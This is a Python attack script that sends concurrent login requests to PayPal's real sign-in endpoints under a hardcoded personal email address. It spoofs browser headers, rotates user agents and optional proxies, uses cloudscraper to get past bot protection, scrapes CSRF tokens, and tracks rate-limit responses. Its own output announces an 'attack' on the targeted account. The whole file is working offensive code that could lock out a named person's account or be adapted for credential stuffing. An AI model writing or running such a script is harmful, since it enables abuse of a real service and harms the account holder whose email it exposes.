import requests
import cloudscraper
from concurrent.futures import ThreadPoolExecutor
from faker import Faker
import time
import random
import logging
import re

# Set up detailed logging to track requests, responses, and headers
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', filename='paypal_endpoint_hits.log')

# Frontend URL for initial session setup
FRONTEND_URL = "https://www.paypal.com/signin"

# Candidate endpoints for PayPal user login (based on observed patterns)
CANDIDATE_ENDPOINTS = [
    "https://www.paypal.com/signin/authorize",
    "https://api.paypal.com/v1/auth/login",
    "https://www.paypal.com/webapps/auth/loginsubmit",
    "https://www.paypal.com/authflow/password-login",
]

# Number of threads/requests (adjusted for testing)
THREAD_COUNT = 50
TOTAL_REQUESTS = 200

# Fake user agent generator
fake = Faker()

# List of proxies (add your own for IP rotation if needed)
PROXIES = [
    # Example format: {"http": "http://proxy1:port", "https": "http://proxy1:port"},
]

# Input fields for PayPal email and password
PAYPAL_EMAIL = "ogorchukwuf@gmail.com"
PAYPAL_PASSWORD = "wrongpassword123"

# Hardcoded headers to mimic PayPal frontend browser request
def get_headers(referer="https://www.paypal.com/signin"):
    return {
        "User-Agent": fake.user_agent(),
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/json; charset=UTF-8",
        "Referer": referer,
        "Origin": "https://www.paypal.com",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "X-Requested-With": "XMLHttpRequest",
        "X-XHR-AJAX": "true",
        "Connection": "keep-alive",
    }

# Hardcoded payload for login attempt (mimics user authentication flow)
def get_payload(correlation_id=""):
    return {
        "username": PAYPAL_EMAIL,
        "password": PAYPAL_PASSWORD,
        "nonce": str(random.randint(100000, 999999)),
        "correlationId": correlation_id if correlation_id else f"web_{int(time.time())}",
        "flowId": "login",  # Often used in PayPal login flows
        "intent": "login",
    }

# Function to extract session data and potential login endpoints from frontend response
def extract_session_data(session, url=FRONTEND_URL):
    try:
        # Simulate initial browser visit to signin page
        init_response = session.get(url, headers=get_headers(), timeout=10)
        cookies = dict(session.cookies)
        
        # Extract CSRF token from cookies or headers
        csrf_token = cookies.get("csrf", "") or cookies.get("X-CSRF-TOKEN", "")
        if not csrf_token:
            csrf_token = init_response.headers.get("X-CSRF-Token", "")
        
        # Extract correlation ID or other tokens from response body (HTML/JS)
        correlation_id = ""
        body_match = re.search(r'correlationId\s*[:=]\s*[\'"]?([^\'";]+)', init_response.text)
        if body_match:
            correlation_id = body_match.group(1)
        else:
            body_tokens = re.findall(r'(?:csrf|token|id)[^>]*value=[\'"]?([^\'" >]+)', init_response.text)
            correlation_id = body_tokens[0] if body_tokens else ""
        
        # Attempt to extract login endpoint or form action from HTML
        login_endpoint = ""
        form_action_match = re.search(r'form\s+[^>]*action=[\'"]?([^\'" >]+)', init_response.text)
        if form_action_match:
            login_endpoint = form_action_match.group(1)
            if not login_endpoint.startswith("http"):
                login_endpoint = "https://www.paypal.com" + login_endpoint if login_endpoint.startswith("/") else "https://www.paypal.com/" + login_endpoint
        else:
            api_calls = re.findall(r'url\s*:\s*[\'"]?([^\'" >]+)', init_response.text)
            for call in api_calls:
                if "login" in call.lower() or "auth" in call.lower():
                    login_endpoint = call if call.startswith("http") else "https://www.paypal.com" + call
        
        logging.info(f"Session Cookies: {cookies}")
        logging.info(f"Response Headers: {dict(init_response.headers)}")
        logging.info(f"Extracted CSRF Token: {csrf_token if csrf_token else 'Not found'}")
        logging.info(f"Extracted Correlation ID: {correlation_id if correlation_id else 'Generated'}")
        logging.info(f"Extracted Login Endpoint: {login_endpoint if login_endpoint else 'Not found, using candidates'}")
        return {
            "csrf_token": csrf_token,
            "correlation_id": correlation_id,
            "cookies": cookies,
            "login_endpoint": login_endpoint
        }
    except Exception as e:
        logging.error(f"Failed to extract session data: {str(e)}")
        return {}

# Function to send a single request using session data
def send_request(request_id, session, scraper, target_url, session_data):
    try:
        proxy = random.choice(PROXIES) if PROXIES else None
        headers = get_headers()
        payload = get_payload(session_data.get("correlation_id", ""))
        
        # Add extracted tokens to headers if available
        if session_data.get("csrf_token"):
            headers["X-CSRF-Token"] = session_data["csrf_token"]
        headers["X-Correlation-ID"] = payload["correlationId"]
        
        try:
            response = session.post(target_url, headers=headers, json=payload, proxies=proxy, timeout=5)
        except requests.exceptions.RequestException:
            response = scraper.post(target_url, headers=headers, json=payload, proxies=proxy, timeout=5)
        
        logging.info(f"Request {request_id} to {target_url} - Status Code: {response.status_code}")
        logging.info(f"Request {request_id} - Request Headers: {headers}")
        logging.info(f"Request {request_id} - Request Payload: {payload}")
        logging.info(f"Request {request_id} - Response Headers: {dict(response.headers)}")
        logging.info(f"Request {request_id} - Response Body: {response.text[:500]}...")
        print(f"Request {request_id} to {target_url} - Status: {response.status_code}")
        return response.status_code
    
    except requests.exceptions.RequestException as e:
        logging.error(f"Request {request_id} to {target_url} failed: {str(e)}")
        print(f"Request {request_id} failed: {str(e)}")
        return None

# Main function to handle concurrent requests
def hit_endpoint():
    request_counter = 0
    successful_requests = 0
    rate_limit_hits = 0
    
    session = requests.Session()
    scraper = cloudscraper.create_scraper(sess=session)
    
    # Extract session data from frontend
    session_data = extract_session_data(session)
    
    # Determine target URL: use extracted endpoint if available, otherwise try candidates
    target_urls = []
    if session_data.get("login_endpoint"):
        target_urls.append(session_data["login_endpoint"])
    target_urls.extend(CANDIDATE_ENDPOINTS)
    
    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        futures = []
        requests_per_url = TOTAL_REQUESTS // len(target_urls) if TOTAL_REQUESTS >= len(target_urls) else 1
        for target_url in target_urls:
            print(f"Targeting endpoint: {target_url}")
            logging.info(f"Targeting endpoint: {target_url}")
            for i in range(requests_per_url):
                request_counter += 1
                futures.append(executor.submit(send_request, request_counter, session, scraper, target_url, session_data))
                time.sleep(random.uniform(0.1, 0.3))
        
        for future in futures:
            status_code = future.result()
            if status_code:
                successful_requests += 1
                if status_code == 429:
                    rate_limit_hits += 1
    
    logging.info(f"Total Requests: {request_counter}, Successful: {successful_requests}, Rate Limited: {rate_limit_hits}")
    print(f"Summary - Total: {request_counter}, Success: {successful_requests}, Rate Limited: {rate_limit_hits}")

if __name__ == "__main__":
    print(f"Starting attack with {TOTAL_REQUESTS} requests using {THREAD_COUNT} threads across multiple endpoints...")
    print(f"Targeting PayPal account: {PAYPAL_EMAIL}")
    hit_endpoint()
    print("Attack completed. Check 'paypal_endpoint_hits.log' for details.")
